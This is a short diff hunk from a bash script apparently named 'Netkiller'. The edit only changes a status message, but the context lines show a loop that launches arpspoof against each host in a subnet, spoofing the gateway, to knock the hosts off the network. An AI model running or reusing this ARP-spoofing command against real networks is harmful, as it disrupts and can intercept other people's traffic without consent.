@@ -136,7 +136,7 @@ if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
         ( arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 ) &
    done
 fi
-echo "Netkiller killing all the hosts in $TARGET_SUBNET"
+echo "Netkiller killed all the hosts in $TARGET_SUBNET"
 echo " "
 echo "To stop, Type: sudo netkiller-stop"
 echo " "
